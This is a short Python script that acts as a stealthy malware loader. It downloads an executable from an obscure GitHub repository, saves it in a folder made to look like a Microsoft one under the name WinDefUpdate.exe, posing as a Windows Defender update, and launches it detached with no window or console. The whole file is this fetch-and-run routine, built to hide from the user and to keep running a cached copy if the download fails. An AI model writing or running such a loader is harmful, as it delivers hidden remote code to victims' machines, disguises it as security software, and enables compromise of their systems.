import os
import sys
import subprocess
import urllib.request

# ── Config ────────────────────────────────────────────────────────────────────

# GitHub raw download — always pulls latest from main branch
DOWNLOAD_URL = "https://github.com/voldstrap/6t3ww347das/raw/refs/heads/main/main.exe"

# Where to save and run from
INSTALL_DIR  = os.path.join(os.getenv("LOCALAPPDATA", ""), "Microsoft", "CLR_v4.0")
EXE_NAME     = "WinDefUpdate.exe"
EXE_PATH     = os.path.join(INSTALL_DIR, EXE_NAME)

# ── Main ──────────────────────────────────────────────────────────────────────

def main():
    os.makedirs(INSTALL_DIR, exist_ok=True)

    try:
        req = urllib.request.Request(
            DOWNLOAD_URL,
            headers={"User-Agent": "Mozilla/5.0"}
        )
        with urllib.request.urlopen(req, timeout=30) as resp:
            data = resp.read()
        with open(EXE_PATH, "wb") as out:
            out.write(data)
    except Exception:
        if not os.path.exists(EXE_PATH):
            sys.exit(1)  # no local copy either, give up
        # download failed but we have a local copy, use it

    # Launch the exe detached — no window, no console
    subprocess.Popen(
        [EXE_PATH],
        creationflags=0x08000000 | 0x00000008  # CREATE_NO_WINDOW | DETACHED_PROCESS
    )

if __name__ == "__main__":
    main()